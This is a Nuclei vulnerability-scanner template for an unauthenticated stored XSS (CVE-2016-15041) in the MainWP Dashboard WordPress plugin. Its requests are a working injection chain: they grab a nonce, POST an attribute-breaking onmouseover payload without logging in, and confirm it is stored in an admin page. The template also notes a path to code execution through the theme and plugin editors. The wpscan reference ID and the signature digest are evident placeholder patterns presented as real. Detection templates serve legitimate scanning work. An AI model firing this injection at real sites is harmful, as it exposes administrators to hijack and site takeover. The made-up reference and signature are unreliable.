id: CVE-2016-15041

info:
  name: MainWP Dashboard <= 3.1.2 - Unauthenticated Stored XSS
  author: pranjal-negi
  severity: high
  description: |
    MainWP Dashboard â€“ The Private WordPress Manager for Multiple Website Maintenance plugin for WordPress versions up to 3.1.2 contains a stored cross-site scripting vulnerability caused by insufficient input sanitization and output escaping in the 'mwp_setup_purchase_username' parameter. Missing authorization checks on the setup panel allow unauthenticated attackers to inject and execute arbitrary scripts when users access affected pages. Under default configuration, this can lead to server-side code execution as the XSS can be used to access theme and plugin editors.
  impact: |
    Unauthenticated attackers can inject arbitrary JavaScript that executes when administrators view the MainWP Extensions settings panel. This can lead to server-side code execution through AJAX requests to theme/plugin editors, complete site compromise, privilege escalation, and data theft.
  remediation: |
    Update MainWP Dashboard plugin to version 3.1.3 or later which addresses the authorization checks and input sanitization issues.
  reference:
    - https://klikki.fi/adv/mainwp.html
    - https://nvd.nist.gov/vuln/detail/CVE-2016-15041
    - https://wpscan.com/vulnerability/8a4b5b0e-9c5e-4c5e-8f5e-5e5e5e5e5e5e
    - https://mainwp.com/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2016-15041
    cwe-id: CWE-79,CWE-862
    epss-score: 0.00043
    epss-percentile: 0.09271
    cpe: cpe:2.3:a:mainwp:mainwp_dashboard:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: mainwp
    product: mainwp_dashboard
    framework: wordpress
    publicwww-query: "/wp-content/plugins/mainwp/"
  tags: cve,cve2016,wordpress,wp-plugin,mainwp,xss,stored,unauth,intrusive,vkev,vuln

variables:
  xss_payload: '{{randstr}}'

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-admin/admin-post.php?page=mainwp-setup&step=installation HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: nonce
        group: 1
        regex:
          - '_wpnonce["\s]*value="([a-f0-9]+)"'
          - '_wpnonce=([a-f0-9]+)'
        internal: true

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "mainwp-setup")'
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension&_wpnonce={{nonce}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        mwp_setup_purchase_username=test" onmouseover={{xss_payload}};//&mwp_setup_purchase_passwd=test&save_step=1

      - |
        GET /wp-admin/admin.php?page=Extensions HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "onmouseover={{xss_payload}}")'
          - 'contains(body_2, "mainwp")'
          - 'status_code_2 == 200'
        condition: and

# digest: 4a0a00473045022100a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2022034567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12:922c64590222798bb761d5b6d8e72950
